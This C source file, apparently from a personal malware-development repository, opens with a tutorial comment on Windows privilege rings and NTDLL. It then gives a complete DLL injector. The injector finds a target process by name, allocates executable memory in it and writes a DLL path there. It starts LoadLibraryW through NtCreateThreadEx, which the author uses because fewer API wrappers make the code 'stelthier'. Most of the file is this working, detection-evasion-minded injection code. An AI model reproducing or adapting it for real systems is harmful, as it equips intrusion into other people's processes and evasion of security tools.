/*
Now that weve played around wiht process injection and are familiar with the APIs, we can start to learn about using the NTDLL APIs. NTDLL is responsible for making system calls which means it interacts directly with the kernel.
Using NTDLL APIs removes a layer of wrappers, since all windows APIs are really just calling NTDLL APIs under the hood. The more wrappers we remove, the stelthier our code will become. 
The ultimate goal is to use syscalls directly, but without something like syswhispers, that will be very tedious and boring

Lets try to understand NTDLLs role in our system, specifically in the transition from user mode to kernel mode.

Usermode vs. Kernel Mode
In x86 architecture, there are 4 rings known as "privilege rings". These rings control access to memory and CPU
They are labled in a heirarchical order with 3 being on the outside and zero being in the center. The close you are to the center (close to zero) the more privs you have.
https://user-images.githubusercontent.com/59679082/226151845-2159100e-9a53-4c1d-9cfe-ef8b041cd1d4.png

So, which rings does windows use? 0 and 3.
Ring 0 is used by the kernel and device drivers. it is whats known as Kernel Mode
Ring 3 is used by user level applications. It is the least privileged ring and most of the applications you use run in this ring (word, web browsers etc...)
    This ring has limited access to resources and is prevented from accessing critical system functions. Its whats known as User Mode

Rings 1 and 2 arent used all the often. Ring 1 is typically used for device drivers that need elevated perms, but dont need kernel mode access
Ring 2 is commonly used by VMs and Hypervisors

https://samsclass.info/140/lec/Excerpted-PRE07_Solomon.pdf
This is an amzing resource on windows internals and i reccomend you check it out.

So, lets look at an example: WriteFile()
When you call write file, a call is made to NtWriteFile which resides in NTDLL. This function then passes into kernel mode, where it becomes a syscall
It makes its way to the appropriate device driver which performs the action requested.

So, as you can see, all we need to do to enter kernel mode is use the NTDLL APIs. So why dont we just use those?
Well you see, NTDLL is offically undocumented. Meaning there is no official documentation like msdn for it. 
Its up to reverse engineers to figure it all out. On top of that, it is very inconsistent. Its functions and strcuts change from version to version of windows. 
On top of that, some syscalls will need to be changed on a per build basis.

Its more practical to use higher level APIs when possible because theres a better chance they will work on other systems. 

You can see much of the RE work thats been done on NTDLL here: http://undocumented.ntinternals.net/

With that out of the way, lets build a PoC injector that will utalize an NTDLL API.
Note that while we can replace all our APIs (which is the goal eventually), to do it all manually like this will be a royal pain in the ass.

We will be replacing CreateRemoteThread with NtCreateThreadEx: https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#LL2324-L2336C7

NTSYSCALLAPI
NTSTATUS
NTAPI
NtCreateThreadEx(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PVOID StartRoutine, // PUSER_THREAD_START_ROUTINE
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
    );

We will reuse most of the code from the previous injector
*/

#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>

char ok[4] = "(+)";
char in[4] = "(*)";
char err[4] = "(-)";

// Here we will define the NDLL API
typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE hProcess,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);

// We can continue through most of the injection the same way

wchar_t dllLocation[MAX_PATH] = L"C:\\Users\\Joker\\Documents\\GitHub\\Malware-Development\\ProcessInjection\\DLL Injection\\DllBasics.dll";
int pathSize = sizeof(dllLocation) + 1; // To account for the null terminator.

int FindTarget(const char* procname){
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcSnap == INVALID_HANDLE_VALUE){
        printf("\n%s Failed to take snapshot, error: %ld", err, GetLastError());

        return EXIT_FAILURE;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(!Process32First(hProcSnap, &pe32)){

        printf("\n%s Failed to parse snapshot, error: %ld", err, GetLastError());
        CloseHandle(hProcSnap);
        return EXIT_FAILURE;
    }
    
    while(Process32Next(hProcSnap, &pe32)){
        if (strcmp(pe32.szExeFile, procname) == 0){
            pid = pe32.th32ProcessID;
            break;            
        }       
    }
    CloseHandle(hProcSnap);
    return pid;
}

int Inject(HANDLE hProc){
    PVOID rBaseAddress = NULL; 
    HANDLE hThread = NULL;
    HMODULE hKernel32 = GetModuleHandleW(L"Kernel32"); // We get a handle to kernel32

    if(!hKernel32){
        printf("\n%s Couldnt get handle to kernel32, error: %ld", err, GetLastError());
        return EXIT_FAILURE;
    }

    printf("\n%s Got handel to Kernel32: 0x%p", ok, hKernel32);

    PVOID loadLib = (PVOID)GetProcAddress(hKernel32, "LoadLibraryW"); // We create our thread start routine with the address of LoadLibraryW()
    pNtCreateThreadEx threadCreate = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx"); // We give our NTDLL API struct a name and set it equal to the address of the actual NtCreateThreadEx API in memory. 

    printf("\n%s Got address of LoadLibraryW(): 0x%p", ok, loadLib);

    if(!threadCreate){
        printf("%s Couldnt get address of NtCreateThreadEx, error: %ld", err, GetLastError());
        return EXIT_FAILURE;
    }

    printf("\n%s Got address of NtCreateThreadEx()", ok, threadCreate);

    // The rest of the injection is pretty much the same
    printf("\n%s Allocating memory...", ok);

    rBaseAddress = VirtualAllocEx(hProc, NULL, pathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    if(rBaseAddress == NULL){
        printf("\n%s Allocate memory failed, error: %ld", err, GetLastError());
        return EXIT_FAILURE;
    }

    printf("\n%s Allocate memory success", ok);
    printf("\n%s Writing to memory...", ok);

    if(!WriteProcessMemory(hProc, rBaseAddress, dllLocation, pathSize, NULL)){
        printf("\n%s Failed to write process memory, error: %ld", err, GetLastError());

        return EXIT_FAILURE;
    }

    printf("\n%s Write to memory success", ok);

    // Now we call out NTDLL API
    threadCreate(
        &hThread,
        0x1FFFFF,
        NULL,
        hProc,
        loadLib,
        rBaseAddress,
        FALSE,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if(hThread == NULL){
        printf("\n%s Failed to create thread", err);
        return EXIT_FAILURE;
    }

    printf("\n%s Created thread using NtCreateThreadEx()", ok);
    printf("\n%s injected directly from NTDLL!", ok);

    // Wait for the thread to finish executing
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    return EXIT_SUCCESS;
}

int main(int argc, const char* argv[]){
    if (argc < 2 || argc > 2){
        printf("\n%s Usage: %s <process name>\n", err, argv[0]);
        return EXIT_FAILURE;
    }

    int pid = 0;
    const char* procname = argv[1];
    HANDLE hProc;


    pid = FindTarget(procname);

    if(pid == EXIT_FAILURE || pid == 0){
        printf("\n%s Could not find target", err);

        if(pid == EXIT_FAILURE){
            printf("\n(-) Process not found. Are you sure the target process is running?");
        }

        return EXIT_FAILURE;
    }

    if(pid){ //if pid is not null
        printf("\n(+) %s PID = %d", procname, pid);

        //open handle
        hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

        if (!hProc || hProc == NULL){
            printf("\n%s Could not get handle to process [%d], err: %ld", err, pid, GetLastError());
            return EXIT_FAILURE;
        }

        printf("\n%s Got handle to process [%d]", ok, pid);

        if(Inject(hProc) != EXIT_SUCCESS){
            printf("%s Failed to inject", err);
            CloseHandle(hProc);
            return EXIT_FAILURE;
        }
    }

    CloseHandle(hProc);
    printf("%s Closed handle to process", ok);
    return EXIT_SUCCESS;
}